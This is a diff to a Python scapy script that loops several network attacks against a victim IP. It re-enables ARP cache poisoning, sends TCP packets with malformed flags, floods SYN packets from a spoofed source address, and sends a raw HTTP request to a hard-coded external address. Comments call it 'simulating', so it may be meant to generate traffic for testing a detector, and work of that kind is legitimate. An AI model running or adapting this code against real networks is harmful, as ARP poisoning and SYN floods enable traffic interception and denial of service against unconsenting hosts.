@@ -1,5 +1,6 @@
-from scapy.all import Ether, ARP, srp, send
+from scapy.all import *
 from scapy.layers.inet import IP, TCP
+from scapy.layers import http
 import argparse
 import time
 import os
@@ -23,6 +24,8 @@ def spoof(target_ip, host_ip, verbose=True):
     Spoofs `target_ip` saying that we are `host_ip`.
     it is accomplished by changing the ARP cache of the target (poisoning)
     """
+    print("Spoofing Attack")
+    time.sleep(1)
     # get the mac address of the target
     target_mac = get_mac(target_ip)
     # craft the arp 'is-at' operation packet, in other words; an ARP response
@@ -39,17 +42,32 @@ def spoof(target_ip, host_ip, verbose=True):
 
 # malformed packet attack
 def single_packet_attack(target):
-    # Craft a TCP packet with the FPA flag set
-    packet = IP(dst=target)/TCP(dport=80, flags='FPA')
+    print("single_packet_attack")
+    time.sleep(1)
+    # Craft a TCP packet with the PAU flag set
+    packet = IP(dst=target)/TCP(dport=80, flags='PAU')
     # Send the packet
-    send(packet)
+    send(packet, verbose=0)
+    time.sleep(4)
 
 # Brute force attack
 def spam_attack(target):
-    for i in range(100):
+    print("Brute force attack")
+    time.sleep(1)
+    for i in range(50):
         pkt = IP(src="192.168.0.1", dst=target)/TCP(flags="S")
-        send(pkt)
-        time.sleep(0.5)
+        send(pkt, verbose=0)
+        time.sleep(0.1)
+
+def bad_url_http_request():
+    print("bad_url_http_request")
+    time.sleep(1)
+    # Create GET request packet
+    get_request = b"GET / HTTP/1.1\r\nHost: 89.159.196.94\r\n\r\n"
+    pkt = IP(dst="89.159.196.94") / TCP(dport=80) / Raw(load=get_request)
+
+    # Send packet and receive response
+    response = sr1(pkt, verbose=0)
 
 if __name__ == "__main__":
     # victim ip address
@@ -62,13 +80,18 @@ if __name__ == "__main__":
     #enable_ip_route()
     while True:
         # attack single packet
+        #TODO not working
         #single_packet_attack(target)
         
         # telling the `target` that we are the `host`
-        #spoof(target, host, verbose)
+        # ARP poisonning
+        spoof(target, host, verbose)
         
         # Brute for simulating
         spam_attack(target)
 
+        # Bas request simulating
+        bad_url_http_request()
+
         # sleep for one second
-        time.sleep(1)
+        time.sleep(5)
